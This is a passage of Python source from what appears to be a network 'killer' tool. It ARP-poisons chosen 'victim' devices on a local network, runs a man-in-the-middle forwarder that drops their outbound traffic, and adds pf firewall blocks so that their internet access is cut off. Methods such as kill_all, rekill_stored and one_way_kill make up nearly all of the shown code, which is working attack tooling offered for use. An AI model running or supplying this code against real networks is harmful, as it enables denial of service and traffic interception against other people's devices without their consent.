            self._restore_arp_now(victim, seq, repeats=repeats, delay_s=0.08)
        if self._op_seq.get(victim['mac']) == seq and victim['mac'] not in self.killed:
            self._stop_forwarder(victim['mac'])
            self._remove_pf_block(victim['ip'])

    def kill_all(self, device_list):
        """
        Safely kill all devices
        """
        for device in device_list[:]:
            if device['admin']:
                continue
            if device['mac'] not in self.killed:
                self._sync_iface_for_victim(device)
                self.kill(device)

    def unkill_all(self, scanner=None):
        """
        Safely unkill all devices killed previously
        """
        try:
            from tools.clumsy_inline import (
                apply_clumsy_ics_router_context,
                heal_ics_client_after_mitm,
                victim_on_clumsy_ics_subnet,
            )
        except Exception:
            apply_clumsy_ics_router_context = None
            heal_ics_client_after_mitm = None
            victim_on_clumsy_ics_subnet = lambda _ip: False

        victims = list(self.killed.values())
        for victim in victims:
            ip = str((victim or {}).get('ip') or '').strip()
            ics = victim_on_clumsy_ics_subnet(ip)
            if ics and scanner is not None and apply_clumsy_ics_router_context:
                try:
                    apply_clumsy_ics_router_context(scanner, self, ip)
                except Exception:
                    pass
            self._sync_iface_for_victim(victim, refresh_router=not ics)
            if ics:
                self.unkill(victim, ics_mode=True)
                if scanner is not None and heal_ics_client_after_mitm:
                    try:
                        heal_ics_client_after_mitm(scanner, self, victim)
                    except Exception:
                        pass
                continue
            mac = victim['mac']
            seq = self._next_op_seq(mac)
            self.killed.pop(mac, None)
            # Immediate restore burst for OFF parity with per-device unkill (no GUI-thread sleep).
            self._restore_arp_now(victim, seq, repeats=3, delay_s=0)
            self._unkill_restore_worker(victim, seq)
            self._stop_forwarder(mac)
        for ip in list(self.pf_blocks):
            self._remove_pf_block(ip)
        # Close persistent socket when done
        self._close_socket()
    
    def store(self):
        """
        Save a copy of previously killed devices
        """
        self.storage = dict(self.killed)
    
    def release(self):
        """
        Remove the stored copy of killed devices
        """
        self.storage = {}
    
    def rekill_stored(self, new_devices):
        """
        Re-kill old devices in self.storage
        """
        try:
            from tools.ics_impairment_policy import should_restore_remembered_kill
        except Exception:
            should_restore_remembered_kill = lambda _d, _s=None: True  # type: ignore

        for mac, old in self.storage.items():
            for new in new_devices:
                # Update old killed with newer ip
                if old['mac'] == new['mac']:
                    old['ip'] = new['ip']
                    break

            # Update new_devices with those it does not have
            if old not in new_devices:
                new_devices.append(old)

            if not should_restore_remembered_kill(old):
                continue
            self.kill(old)

    def one_way_kill(self, victim):
        """
        Kill victim and block their outbound traffic.
        Uses kernel IP forwarding + pf block (fast, no Python overhead).
        
        With sysctl net.inet.ip.forwarding=1:
        - ARP spoof redirects traffic through us
        - Kernel forwards packets at native speed
        - pf blocks outbound from victim (kernel level, instant)
        """
        # Ensure victim is being ARP poisoned
        if victim['mac'] not in self.killed:
            self.kill(victim)
            # Wait for poison to start
            for _ in range(10):
                sleep(0.1)
                if victim['mac'] in self.killed:
                    break
        
        # Block outbound at kernel level with pf (no slow Python forwarder)
        self._enforce_pf_block(victim['ip'])

    def _start_one_way_forwarder(self, victim, debug=False):
        if victim['mac'] in self.forwarders:
            self.forwarders[victim['mac']].stop()
        if not self.router.get('mac'):
            if debug:
                print(f"[killer] Cannot start forwarder: router MAC unknown")
            return
        iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
        if not iface_to_use or iface_to_use == 'NULL':
            if debug:
                print(f"[killer] Cannot start forwarder: invalid interface")
            return
        fw = MitmForwarder(debug=debug)
        fw.start(
            victim=victim,
            router=self.router,
            iface_name=iface_to_use,
            iface_mac=self.iface.mac,
            drop_from_victim=True,
            drop_to_victim=False,
        )
        self.forwarders[victim['mac']] = fw
        if debug:
            print(f"[killer] Forwarder started for {victim['ip']}")
    
    def get_forwarder_stats(self, mac):
        """Get stats for a specific forwarder"""
        fw = self.forwarders.get(mac)
        if fw:
            return fw.get_stats()
        return None

    def _stop_forwarder(self, mac):
        fw = self.forwarders.pop(mac, None)
        if fw:
            fw.stop()
        # Keep kernel forwarding OFF when idle so the next Kill cannot leak through
        # a failed disable. Clumsy/ICS turns forwarding on when that path needs it.
        if not self.forwarders and not self.killed:
            disable_ip_forwarding()

    def _enforce_pf_block(self, victim_ip: str):
        if victim_ip in self.pf_blocks:
            return
        if ensure_pf_enabled() and install_anchor():
            if block_all_for(self.iface.name, victim_ip):
                self.pf_blocks.add(victim_ip)

    def _remove_pf_block(self, victim_ip: str):
        if victim_ip not in self.pf_blocks:
            return
        if ensure_pf_enabled() and install_anchor():
            unblock_all_for(victim_ip)
        self.pf_blocks.discard(victim_ip)
